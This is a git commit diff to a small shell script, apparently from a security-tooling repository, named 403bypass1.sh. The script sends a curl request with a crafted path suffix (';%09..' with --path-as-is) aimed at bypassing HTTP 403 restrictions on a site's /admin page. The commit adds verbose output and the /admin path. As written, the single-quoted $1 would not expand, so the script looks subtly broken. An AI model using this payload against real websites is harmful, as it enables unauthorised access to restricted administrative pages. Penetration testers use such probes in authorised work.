6b3e751950b5f856350aefd18328fad0b6f0287c
hackingyseguridad <antonio_taboada@hotmail.es>
2026-01-16 21:03:25 +0100

    Update 403bypass1.sh

--- 403bypass1.sh
+++ 403bypass1.sh
@@ -6,4 +6,4 @@
 # Usp: 
 # sh 403bypass1.sh  https://pagina.com/admin
 
-curl -k -s -I --path-as-is -X GET '$1;%09..' -H 'User-Agent: Mozilla/5.0'
+curl -vvv -k -s -I --path-as-is -X GET '$1/admin;%09..' -H 'User-Agent: Mozilla/5.0'
